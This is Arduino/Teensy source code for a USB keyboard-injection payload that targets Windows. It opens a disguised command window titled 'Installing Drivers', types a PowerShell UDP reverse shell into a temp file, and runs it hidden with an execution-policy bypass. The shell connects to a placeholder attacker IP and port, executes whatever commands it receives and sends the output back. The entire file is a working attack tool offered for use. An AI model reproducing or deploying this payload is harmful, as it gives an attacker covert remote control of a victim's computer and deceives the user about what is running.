#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  delay(1000);
     
  Keyboard.println("echo $ep = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse(\"INPUT0\"),INPUT1);  > %temp%\\rudp.ps1");
  Keyboard.println("echo $cl = New-Object System.Net.Sockets.UDPClient(INPUT1); >> %temp%\\rudp.ps1");
  Keyboard.println("echo [byte[]]$bts = 0..65535^|%{0}  >> %temp%\\rudp.ps1");
  Keyboard.println("echo $sbt = ([text.encoding]::ASCII).GetBytes(\"PS> \")  >> %temp%\\rudp.ps1");
  Keyboard.println("echo $cl.Send($sbt,$sbt.Length,$ep)  >> %temp%\\rudp.ps1");
  Keyboard.println("echo while($true){  >> %temp%\\rudp.ps1");
  Keyboard.println("echo $rb = $cl.Receive([ref]$ep)  >> %temp%\\rudp.ps1");
  Keyboard.println("echo $rd = ([text.encoding]::ASCII).GetString($rb)  >> %temp%\\rudp.ps1");
  Keyboard.println("echo $rs = (iex $rd ^| Out-String ) >> %temp%\\rudp.ps1");
  Keyboard.println("echo $sb = $rs +  \"PS \" + (pwd).Path + \"> \" >> %temp%\\rudp.ps1");
  Keyboard.println("echo $sbt = ([text.encoding]::ASCII).GetBytes($sb) >> %temp%\\rudp.ps1");
  Keyboard.println("echo $cl.Send($sbt,$sbt.Length,$ep)} >> %temp%\\rudp.ps1");
  Keyboard.println("echo $cl.Close() >> %temp%\\rudp.ps1");
  
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\rudp.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\rudp.ps1\"),0,true >> %temp%\\rudp.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\rudp.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}

 DEFS
